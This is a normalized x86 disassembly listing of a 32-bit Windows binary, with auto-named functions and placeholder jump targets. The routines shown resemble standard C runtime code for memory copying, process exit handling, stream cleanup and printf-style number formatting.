palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40e244
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_40e276
push 0xc
push r--data
call sub_41d1f0
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push 0x2
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call sub_40e3d0
test al al
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e380
test esi esi
jne r-xdata
xor eax eax
inc eax
mov ecx rw-data
xchg [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push [ ebp + 0x8 ]
call sub_40e414
pop ecx
call sub_41d239
retn
push [ ebp + 0x8 ]
call sub_40e38f
cmp edi 0x1
jne r-xdata
mov ebx [ rw-data ]
mov edx ebx
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor eax eax
ror eax cl
xor eax ebx
mov ecx [ rw-data ]
cmp ecx eax
je r-xdata
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
xor ebx ecx
xor eax eax
push eax
push eax
push eax
mov ecx edx
ror ebx cl
mov ecx ebx
call [ r--data ]
call ebx
push r--data
push r--data
call sub_41165f
pop ecx
pop ecx
test esi esi
jne r-xdata
push r--data
push r--data
call sub_41165f
pop ecx
pop ecx
call sub_411ba5
pop ecx
mov [ rw-data ] 0x1
sub_40e38f
mov edi edi
push ebp
mov ebp esp
call sub_412ddf
test al al
je r-xdata
push [ ebp + 0x8 ]
call sub_40e414
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
mov eax [ fs : 0x30 ]
mov eax [ eax + 0x68 ]
shr eax 0x8
test al 0x1
jne r-xdata
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
sub_40e3d0
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
mov eax 0x5a4d
cmp [ ecx ] ax
jne r-xdata
xor al al
retn
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp [ eax + 0xe8 ] 0x0
setne al
retn
sub_40e414
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push esi
push r--data
push [ ebp - 0x8 ]
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
pop esi
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
sub_40e4c1
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
cmp [ rw-data ] eax
jne sub_411d97
push [ ebp + 0x8 ]
call sub_40e244
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_40e530
mov eax [ rw-data ]
push esi
push 0x3
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_411ef8
push 0x0
mov [ rw-data ] eax
call sub_411e2d
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax esi
mov [ rw-data ] eax
push edi
xor edi edi
mov esi rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_411ef8
push 0x0
mov [ rw-data ] eax
call sub_411e2d
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0x10 ] 0xfffffffe
cmp eax 0xfffffffe
je r-xdata
or eax 0xffffffff
pop esi
retn
push 0x0
push 0xfa0
lea eax [ esi + 0x20 ]
push eax
call sub_412c73
mov eax [ rw-data ]
mov edx edi
sar edx 0x6
mov [ eax + edi * 4 ] esi
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov eax [ eax + ecx + 0x18 ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add esi 0x38
inc edi
cmp esi rw-data
jne r-xdata
sub_40e60a
push esi
call sub_413743
call sub_4135f6
xor esi esi
mov eax [ rw-data ]
push [ esi + eax ]
call sub_413824
mov eax [ rw-data ]
pop ecx
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
add esi 0x4
cmp esi 0xc
jne r-xdata
push [ rw-data ]
call sub_411e2d
and [ rw-data ] 0x0
pop ecx
pop esi
retn
sub_40e67c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
push edi
or edi 0xffffffff
shr eax 0xd
test al 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
jmp r-xdata
push esi
call sub_413a50
pop ecx
mov eax edi
pop edi
push esi
call sub_413696
push esi
mov edi eax
call sub_413824
push esi
call sub_413c50
push eax
call sub_413b35
add esp 0x10
test eax eax
jns r-xdata
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_411e2d
and [ esi + 0x1c ] 0x0
pop ecx
sub_40e6f2
push 0x10
push r--data
call sub_40b2f0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x20 ] esi
xor eax eax
test esi esi
setne al
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
shr eax 0xc
push esi
test al 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
and [ ebp - 0x1c ] 0x0
call sub_40e654
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40e67c
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e768
mov eax esi
call sub_413a50
pop ecx
jmp r-xdata
call sub_40b336
retn
or eax 0xffffffff
jmp r-xdata
sub_40e772
push 0xc
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_40e654
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_40eec5
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e7b7
mov eax esi
call sub_40b336
retn 0xc
sub_40e7c3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_40e772
mov esp ebp
pop ebp
retn
sub_40e7eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_40ee04
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_40ee87
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
or eax 0x0
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_40edcf
lea ecx [ ebp - 0x45c ]
call sub_40f274
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
xor ecx ecx
mov [ edi + eax * 2 ] cx
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ edi ] ax
jmp r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
mov [ edi + ebx * 2 - 0x2 ] ax
jmp r-xdata
jmp r-xdata
sub_40e970
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
pop ebp
retn
call sub_4135e3
mov [ eax ] 0x16
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e7eb
add esp 0x1c
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_4135e3
mov [ eax ] 0x22
jmp r-xdata
call sub_413527
or eax 0xffffffff
sub_40ea02
mov edi edi
push ebp
mov ebp esp
push ecx
or eax 0xffffffff
xor edx edx
push esi
mov esi [ ebp + 0x8 ]
div esi
push edi
and eax 0xfffffffe
mov edi ecx
cmp eax 0x2
jae r-xdata
push ebx
xor ebx ebx
add esi esi
cmp [ edi + 0x404 ] ebx
jne r-xdata
call sub_4135e3
mov [ eax ] 0xc
xor al al
jmp r-xdata
cmp esi [ edi + 0x400 ]
ja r-xdata
cmp esi 0x400
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_411e67
mov [ ebp - 0x4 ] eax
pop ecx
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
push eax
call sub_411e2d
pop ecx
mov al bl
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ edi + 0x404 ]
call sub_40eea1
mov eax [ ebp - 0x4 ]
mov bl 0x1
mov [ edi + 0x400 ] esi
pop ebx
sub_40ea88
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
dec eax
sub eax 0x1
je r-xdata
xor al al
pop ebp
retn
sub eax 0x1
je r-xdata
mov al 0x1
pop ebp
retn
sub eax 0x9
je r-xdata
cmp [ ebp + 0x14 ] 0xd
je r-xdata
mov al [ ebp + 0x10 ]
cmp al 0x63
je r-xdata
mov cl 0x1
cmp al 0x73
je r-xdata
xor cl cl
jmp r-xdata
xor eax eax
test cl cl
sete al
pop ebp
retn
sub_40eac8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
dec eax
sub eax 0x1
je r-xdata
xor al al
pop ebp
retn
sub eax 0x1
je r-xdata
mov al 0x1
pop ebp
retn
sub eax 0x9
je r-xdata
cmp [ ebp + 0x14 ] 0xd
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x4
mov dl 0x1
or eax ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x63
je r-xdata
mov dl cl
mov cl 0x1
cmp [ ebp + 0x10 ] 0x73
jne r-xdata
xor eax eax
cmp dl cl
sete al
pop ebp
retn
sub_40eb17
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x404 ]
call sub_40e9ea
test edi edi
jne r-xdata
add eax edi
add eax esi
jmp r-xdata
pop edi
pop esi
retn
sub_40eb35
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_40e9ea
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_40ebaa
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_40e9ea
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_41d150
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_40ec32
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
call sub_410612
cmp [ edi ] 0xffffffff
je r-xdata
sub_40ec5e
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push ebx
movsx bx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
pop edi
pop ebx
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ebx
call sub_41064f
cmp [ edi ] 0xffffffff
je r-xdata
sub_40ec8f
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x28 ] eax
mov [ ecx + 0x30 ] ax
mov [ ecx + 0x38 ] eax
mov [ ecx + 0x3c ] al
mov [ ecx + 0x440 ] eax
mov [ ecx + 0x444 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_40ecd6
mov edi edi
push ebp
mov ebp esp
push ecx
xor edx edx
mov [ ebp - 0x4 ] ecx
xor eax eax
mov [ ecx ] edx
mov [ ecx + 0x32 ] ax
mov eax ecx
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] edx
mov [ ecx + 0x10 ] edx
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov [ ecx + 0x24 ] edx
mov [ ecx + 0x28 ] edx
mov [ ecx + 0x30 ] dl
mov [ ecx + 0x38 ] edx
mov [ ecx + 0x3c ] dl
mov [ ecx + 0x440 ] edx
mov [ ecx + 0x444 ] edx
mov esp ebp
pop ebp
retn
sub_40ed22
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40ec8f
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_40ed5e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40ecd6
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_40ed9a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ed22
and [ esi + 0x450 ] 0x0
call sub_4135e3
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_40edcf
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ed5e
and [ esi + 0x450 ] 0x0
call sub_4135e3
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_40ee04
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov [ edi + 0xc ] 0x0
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ecx ]
mov [ edi + 0x4 ] eax
mov eax [ ecx + 0x4 ]
jmp r-xdata
push esi
call sub_41320e
lea edx [ edi + 0x4 ]
mov [ edi ] eax
push edx
lea esi [ edi + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ edx ] ecx
mov ecx [ eax + 0x48 ]
push eax
mov [ esi ] ecx
call sub_414f8c
push esi
push [ edi ]
call sub_414fb9
mov ecx [ edi ]
add esp 0x10
mov eax [ ecx + 0x350 ]
pop esi
test al 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x4 ] eax
mov eax [ rw-data ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x350 ] eax
mov [ edi + 0xc ] 0x1
sub_40eea1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push [ esi ]
call sub_411e2d
mov edx [ ebp + 0x8 ]
and [ esi ] 0x0
pop ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax esi
and [ edx ] 0x0
pop esi
pop ebp
retn 0x4
sub_40eec5
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_4146e5
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_40ee04
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_40ed9a
lea ecx [ ebp - 0x45c ]
call sub_40f158
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_40ee87
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_41479a
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_40ef82
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov bl [ eax ]
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al bl
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
inc ecx
pop ebx
pop ebp
retn
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x65
je r-xdata
mov edx ecx
cmp al 0x45
je r-xdata
dec ecx
cmp [ ecx ] 0x30
je r-xdata
cmp [ ecx ] bl
jne r-xdata
inc ecx
mov al [ edx ]
inc ecx
inc edx
mov [ ecx ] al
test al al
jne r-xdata
dec ecx
sub_40efd9
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor ecx ecx
movsx eax cl
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_40f00b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_40f042
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_4149b9
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_41480b
test eax eax
movsx eax [ esi ]
push eax
call sub_4149b9
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp + 0xc ]
mov cl [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
pop ebp
retn
sub_40f09e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_414a04
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_40f0fa
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_414a30
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_40f158
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_41054d
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_40efd9
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_40f254 ]
mov ecx esi
call sub_40f41e
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
